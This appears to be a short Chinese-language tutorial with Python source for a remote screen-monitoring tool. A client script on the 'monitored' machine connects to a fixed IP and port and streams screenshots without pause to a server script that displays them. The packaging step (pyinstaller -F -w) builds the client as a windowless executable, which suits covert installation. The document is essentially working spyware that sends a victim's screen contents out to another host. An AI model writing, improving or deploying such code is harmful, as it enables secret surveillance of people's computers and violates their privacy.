* pyinstall 打包工具，视平台需要安装
* opencv-python
* pillow

# Client被监控方
```python
from socket import *
from PIL import ImageGrab
import os

s=socket()
s.connect(('192.168.74.1',8888))


choice = s.recv(1024).decode()

if choice == '1':
    while True:
# 截图
        image = ImageGrab.grab()
        image = image.resize((960, 540))
        image.save('screenshot.png')

# 保存截图文件
        size = os.path.getsize('screenshot.png')
        s.send(str(size).encode())
        s.recv(1024)

# 传送截图文件
        with open('screenshot.png', 'rb') as f:
            for line in f:
                s.send(line)
        s.recv(1024)


# 打包： pyinstaller -F -w -i client.py
```
# Server监控端
```python
from socket import *
import cv2

S = socket()
S.bind(('192.168.74.1', 8888))

S.listen()

s,addr = S.accept()

print('1. 远程监视')
choice = input('请输入你的选择：')
s.send(choice.encode())

if choice == '1':
    while True:
        size = int(s.recv(1024).decode())
        s.send('ok'.encode())
        
        cursize = 0
        with open('screenshot.png', 'wb') as f:
            while cursize < size:
                data = s.recv(1024)
                cursize += len(data)
                f.write(data)

# 显示截图图片
        cv2.namedWindow('screenshot') # 准备窗口
        image = cv2.imread('screenshot.png') # 读取截取图片
        cv2.imshow('screenshot', image) # 显示窗口
        
# 每20ms刷新一次
        cv2.waitKey(20)
        
        s.send('ok'.encode())
```

# 改善
* 传输效率
* 界面可调节
* 优雅监控
